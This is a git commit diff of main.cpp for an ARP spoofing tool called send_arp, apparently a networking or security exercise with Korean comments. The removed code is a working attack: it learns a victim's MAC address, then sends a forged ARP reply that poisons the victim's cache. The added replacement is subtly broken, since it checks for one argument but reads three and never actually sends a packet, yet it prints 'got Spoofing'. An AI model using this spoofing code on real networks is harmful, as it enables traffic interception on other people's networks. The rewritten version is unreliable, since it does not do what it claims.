a8ae830a1c5fe4b9e722952141d24a04b81524ab
jiwoongKo <67853629+jiwoongKo@users.noreply.github.com>
2020-09-13 19:10:23 +0900

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -2,12 +2,97 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <arpa/inet.h>
-#include "libnet-headers.h"
+#include <stdint.h>
+#include <string.h>
+#include <sys/socket.h>
+#include "header_lib.h"
+
+
+struct sniff_ip_hdr* iph;
+struct sniff_tcp_hdr* tcph;
+struct sniff_arp_hdr* arph_receive;
+
+
+char *payload;
+u_int size_ip;
+u_int size_tcp;
+
+
+int get_my_ip_str(char *dev, char *str, int len);
+int get_my_mac_str(char *dev, char *str, int len);
+void send_arp_packet(char* argv[], pcap_t* handle, int state);
+
 
 void usage() {
-  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
-  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
+    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
+    printf("sample: send_arp wlan0 192.168.0.1 192.168.0.7\n");
 }
+
+
+int main(int argc, char* argv[]) { 
+    if (argc != 2) {
+    usage();
+    return -1;
+    }
+
+    char* dev = argv[1];
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+
+    if (handle == NULL) {
+        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
+    return -1;
+    }
+
+    send_arp_packet(argv, handle, NORMAL);
+    struct sniff_ethernet *ether;
+
+  while (true) {
+    struct pcap_pkthdr* header;
+    const u_char* packet;
+    int res = pcap_next_ex(handle, &header, &packet);
+    if (res == 0) continue;
+    if (res == -1 || res == -2) break;
+    printf("\n============%u bytes captured============\n", header->caplen);
+    ether = (struct sniff_ethernet *)packet;
+
+
+    /* ARP 패킷이 맞다면 패킷값 출력*/
+    if (ntohs(ether->type)== 0x0806) 
+    {   /* ARP 헤더의 데이터 */
+        arph_receive = (struct sniff_arp_hdr *)(packet + sizeof(struct sniff_ethernet));
+        printf("\n================= ARP Packet ==============================\n");
+        printf("src address : ");
+        for(int i=0; i < IP_V; i++){
+            printf("%d.", arph_receive->send_ip[i]);
+        }
+        printf("\ndst address : ");
+        for(int i=0; i < IP_V; i++){
+            printf("%d.", arph_receive->target_ip[i]);
+        }
+        printf("\nARP type : %u\n", ntohs(arph_receive->arp_opcode));
+
+
+        printf("================ src MAC address ==============\n");
+        for(int i=0; i < ETHER_ALEN; i++ ){
+            printf("%02x:", arph_receive->send_mac[i]);
+        }
+        printf("\n================ dst MAC address ==============\n");
+        for(int i=0; i < ETHER_ALEN; i++){
+            printf("%02x:", arph_receive->target_mac[i]);
+        }
+        printf("\n");
+        break;
+    }
+  }
+
+  send_arp_packet(argv, handle, ABNORMAL);
+  printf("\ngot Spoofing\n");
+
+  return 0;
+}
+
+
 
 
 int get_my_ip_str(char *dev, char *str, int len) {
@@ -24,55 +109,6 @@ int get_my_ip_str(char *dev, char *str, int len) {
         return EXIT_SUCCESS;
 }
 
-
-int send_arp_packet(pcap_t *handle, char* src_mac, char* dst_mac, char* src_ip, char* dst_ip, unsigned short int type) {
-        struct eth_hdr* eth_header;
-        struct arp_hdr* arp_header;
-
-        u_char send_buf[42]; // initialized
-        eth_header = (struct eth_hdr*)send_buf;
-
-        if (type == ARPOP_REQUEST || dst_mac == NULL) {
-            sscanf("ff:ff:ff:ff:ff:ff", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth_header->dst[0], &eth_header->dst[1],
-             &eth_header->dst[2], &eth_header->dst[3], &eth_header->dst[4], &eth_header->dst[5]);
-        } else {
-            sscanf(dst_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth_header->dst[0], &eth_header->dst[1],
-             &eth_header->dst[2], &eth_header->dst[3], &eth_header->dst[4], &eth_header->dst[5]);
-        }
-
-        sscanf(src_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth_header->src[0], &eth_header->src[1], &eth_header->src[2], &eth_header->src[3], &eth_header->src[4], &eth_header->src[5]);
-        eth_header->type = ntohs(0x0806);
-
-
-
-        arp_header = (struct arp_hdr*)(send_buf + sizeof(struct eth_hdr));
-        arp_header->arp_hrd = ntohs(ARPHRD_ETHER);
-        arp_header->arp_pro = ntohs(0x0800);
-        arp_header->arp_hln = 6;
-        arp_header->arp_pln = 4;
-        arp_header->arp_op = ntohs(type);
-
-
-        sscanf(src_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp_header->arp_sha[0], &arp_header->arp_sha[1], &arp_header->arp_sha[2], &arp_header->arp_sha[3], &arp_header->arp_sha[4], &arp_header->arp_sha[5]);
-        sscanf(src_ip, "%hhd.%hhd.%hhd.%hhd", &arp_header->arp_spa[0], &arp_header->arp_spa[1], &arp_header->arp_spa[2], &arp_header->arp_spa[3]);
-        if (type == ARPOP_REQUEST || dst_mac == NULL) {
-                sscanf("00:00:00:00:00:00", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp_header->arp_tha[0], &arp_header->arp_tha[1], &arp_header->arp_tha[2], &arp_header->arp_tha[3], &arp_header->arp_tha[4], &arp_header->arp_tha[5]);
-        }else{
-                sscanf(dst_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp_header->arp_tha[0], &arp_header->arp_tha[1], &arp_header->arp_tha[2], &arp_header->arp_tha[3], &arp_header->arp_tha[4], &arp_header->arp_tha[5]);
-        }
-
-        sscanf(dst_ip, "%hhd.%hhd.%hhd.%hhd", &arp_header->arp_tpa[0], &arp_header->arp_tpa[1], &arp_header->arp_tpa[2], &arp_header->arp_tpa[3]);
-
-        int pack_len = sizeof(struct eth_hdr) + sizeof(struct arp_hdr);
-            if (pcap_sendpacket(handle, send_buf, pack_len) == -1) {
-                fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));
-                return EXIT_FAILURE;
-            } else {
-                return EXIT_SUCCESS;
-            }
-
-}
-
 int get_my_mac_str(char *dev, char *str, int len) {
         FILE* fp;
         char cmdbuf[256];
@@ -87,100 +123,64 @@ int get_my_mac_str(char *dev, char *str, int len) {
         return EXIT_SUCCESS;
 }
 
-int main(int argc, char* argv[]){
+void send_arp_packet(char* argv[], pcap_t* handle, int state) {
+    struct sniff_ethernet* ethernet;
+    struct sniff_arp_hdr* arp_header;
 
-    char my_ip_addr_str[20];
+    /* 패킷 전송 */
+    u_char send_packet[500];
+    memset(send_packet, 0, sizeof(send_packet));
+    char my_ip[30];
+    char my_mac[30];
 
-    char my_mac_addr_str[25];
-    char *sender_ip_addr_str = argv[2]; //sender ip address string
-    char sender_mac_addr_str[25];
-    char *target_ip_addr_str = argv[3];
-
-    u_char sender_mac_addr[6];
-
-    char* dev = argv[1]; // dev = wlan0
-    char errbuf[PCAP_ERRBUF_SIZE];
-
-    struct pcap_pkthdr *hd;
-    struct eth_hdr *eth_header;
-    struct arp_hdr *arp_header;
-    const u_char *pk;
+    /* 이더넷 ip, mac 패킷 받아들임*/
+    get_my_ip_str(argv[1], my_ip, sizeof(my_ip));
+    get_my_mac_str(argv[1], my_mac, sizeof(my_mac));
 
 
-    if (argc != 4) {
-      usage();
-      return -1;
-    }
+    /* 이더넷 패킷 설정 */
+    ethernet = (struct sniff_ethernet*)send_packet;
+    
+    
+    /* 이더넷 프로토콜 ARP타입 */
+    ethernet->type = ntohs(0x0806);
+    sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &ethernet->ether_shost[0],&ethernet->ether_shost[1],&ethernet->ether_shost[2],
+            &ethernet->ether_shost[3],&ethernet->ether_shost[4],&ethernet->ether_shost[5]);
 
+    memcpy(send_packet, &ethernet, sizeof(ethernet));
 
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); // packet capture
+    arp_header = (struct sniff_arp_hdr*)(send_packet + sizeof(struct eth_hdr));
+    arp_header->arp_htype = ntohs(ARPH_ETHER);
+    arp_header->arp_ptype = ntohs(0x0800);
+    arp_header->arp_hlen = 6;
+    arp_header->arp_plen = 4;
+    arp_header->arp_opcode = ntohs(1);
 
-    if (handle == NULL) {
-      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
-      return -1;
-    }
+      sscanf(argv[2], "%hhd.%hhd.%hhd.%hhd",
+              &arp_header->target_ip[0],&arp_header->target_ip[1],
+              &arp_header->target_ip[2],&arp_header->target_ip[3]);
 
-    if (get_my_ip_str(dev, my_ip_addr_str, sizeof(my_ip_addr_str) - 1) == EXIT_FAILURE) {// Attacker MAC Address 를 얻어옴
-            perror("Fail to fetch IPv4 address\n");
-            exit(EXIT_FAILURE);
-    }
+      if(state == NORMAL) {
+        sscanf(my_ip, "%hhd.%hhd.%hhd.%hhd",
+               &arp_header->send_ip[0],&arp_header->send_ip[1],
+               &arp_header->send_ip[2],&arp_header->send_ip[3]);
+        sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+               &arp_header->send_mac[0],&arp_header->send_mac[1],&arp_header->send_mac[2],
+               &arp_header->send_mac[3],&arp_header->send_mac[4],&arp_header->send_mac[5]);
+      }
+      else {
+        sscanf(argv[3], "%hhd.%hhd.%hhd.%hhd", &arp_header->send_ip[0],&arp_header->send_ip[1],
+                &arp_header->send_ip[2],&arp_header->send_ip[3]);
+        sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+               &arp_header->send_mac[0],&arp_header->send_mac[1],&arp_header->send_mac[2],
+               &arp_header->send_mac[3],&arp_header->send_mac[4],&arp_header->send_mac[5]);
+        for(int i = 0; i < 6; i++)
+            arp_header->target_mac[i] = arph_receive->target_mac[i];
+      }
 
+      memcpy(send_packet+sizeof(ethernet), &arp_header, sizeof(arp_header));
 
-    if (get_my_mac_str(dev, my_mac_addr_str, sizeof(my_mac_addr_str) - 1) == EXIT_FAILURE) { // Attacker IP Address 를 얻어옴
-            perror("Fail to fetch Mac address\n");
-            exit(EXIT_FAILURE);
-    }
+      return;
 
-    printf("Attacker IP : : %s\n", my_ip_addr_str);
-    printf("ATtacker MAC : %s\n", my_mac_addr_str);
-
-
-    //send ARP Request
-    send_arp_packet(handle, my_mac_addr_str, NULL, my_ip_addr_str, sender_ip_addr_str, ARPOP_REQUEST);
-
-    //recv ARP reply
-        while(1) {
-            int status = pcap_next_ex(handle, &hd, &pk);
-            if (status == 0) {
-                printf("no packet\n");
-                continue;
-            } else if (status == -1) {
-                 fprintf(stderr, "Failed to set buffer size on capture handle : %s\n",
-                            pcap_geterr(handle));
-                break;
-            } else if (status == -2) {
-                fprintf(stderr, "Finished reading packet data from packet files\n");
-                break;
-            }
-            eth_header = (struct eth_hdr*)pk;
-            if (ntohs(eth_header->type) == 0x0806) { // 0x0806 → ETHERTYPE_ARP
-                arp_header = (struct arp_hdr*)(pk+ sizeof(struct eth_hdr));
-            } else {
-                //not arp proto
-                continue;
-            }
-            if (ntohs(arp_header->arp_pro) != 0x0800) { // 0x0800 → ETHERTYPE_IP
-                //not IPv4 ARP
-                continue;
-            }
-            if (ntohs(arp_header->arp_op) != ARPOP_REPLY) {
-                //not ARP reply
-                continue;
-            }
-            for (int i=0; i < 6; i++) {
-                sender_mac_addr[i] = arp_header->arp_sha[i];
-            }
-            sprintf(sender_mac_addr_str, "%02X:%02X:%02X:%02X:%02X:%02X", sender_mac_addr[0], sender_mac_addr[1],
-             sender_mac_addr[2],sender_mac_addr[3],sender_mac_addr[4],sender_mac_addr[5]);
-            break;
-        }
-
-
-        //recv ARP reply
-        send_arp_packet(handle, my_mac_addr_str, sender_mac_addr_str, target_ip_addr_str, sender_ip_addr_str, ARPOP_REPLY);
-
-
-
-    pcap_close(handle);
-    return 0;
 }
